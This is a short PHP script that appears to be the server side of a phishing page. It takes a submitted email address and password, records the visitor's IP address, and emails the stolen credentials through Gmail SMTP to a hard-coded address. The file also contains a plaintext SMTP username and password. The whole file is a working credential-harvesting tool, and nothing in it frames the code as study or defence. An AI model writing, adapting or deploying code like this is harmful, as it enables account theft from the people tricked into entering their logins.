<?php 
use PHPMailer\PHPMailer\PHPMailer;

if(isset($_POST['password']) && isset($_POST['email']) && isset($_POST['detail'])){
  $password = $_POST['password'];
  $email = $_POST['email'];
  $field = $_POST['detail'];
  $ip = $_SERVER['HTTP_CLIENT_IP']; 


  function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
 

  require_once "PHPMailer/PHPMailer.php";
  require_once "PHPMailer/SMTP.php";
  require_once "PHPMailer/Exception.php";

  $mail = new PHPMailer();

  //smtp settings
  $mail->isSMTP();
  $mail->Host = 'smtp.gmail.com';
  $mail->SMTPAuth = true;
  $mail->Username = 'imkaarno@gmail.com';
  $mail->Password = '121711432000';
  $mail->Port = 465;
  $mail->SMTPSecure = 'ssl';

  //email settings
  $mail->isHTML(true);
  $mail->setFrom($email, $field, 'Message');
  $mail->addAddress('imkaarno@gmail.com');
  $mail->Subject = ('$email');
  $mail->Body =  '📧 Email address => ' . $email  . 
  '<br> ======================'. 
  '<br> 📩 Email password => ' . $password .
   '<br> ======================' . 
   '<br> 🖥 Mail sender => ' . $field . 
   '<br> ======================'  .
   '<br> ۩ IP address => ' . get_client_ip(); 

  if($mail->send()){
    $response['status'] = "success";
    $response['message'] = "Email is sent";
  }
  else
  {
    $response['status'] = "failed";
    $response['message'] = "something is wrong: <br>" . $mail->ErrorInfo;
  }

  echo(json_encode($response));

}
?>